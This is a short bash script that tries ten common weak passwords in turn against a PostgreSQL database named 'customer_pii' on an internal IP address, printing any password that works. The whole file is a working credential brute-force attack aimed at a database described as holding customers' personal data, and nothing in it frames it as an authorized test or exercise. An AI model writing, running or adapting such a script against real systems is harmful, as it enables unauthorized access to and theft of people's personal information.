#!/bin/bash
DB_HOST="172.31.24.10"
DB_NAME="customer_pii"
DB_USER="internaluser"
PASSWORDS=(
    "password1"
    "123456"
    "admin"
    "qwerty"
    "letmein"
    "welcome"
    "MyPassword@123"
    "password123"
    "passw0rd"
    "12345678"
)
for PASS in "${PASSWORDS[@]}"; do
    sudo -u postgres PGPASSWORD="${PASS}" psql -h "${DB_HOST}" -U "${DB_USER}" -d "${DB_NAME}" -c "\q" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Success! Valid password found: ${PASS}"
        exit 0
    else
        echo "Failed with password: ${PASS}"
    fi
    sleep 1
done
exit 1
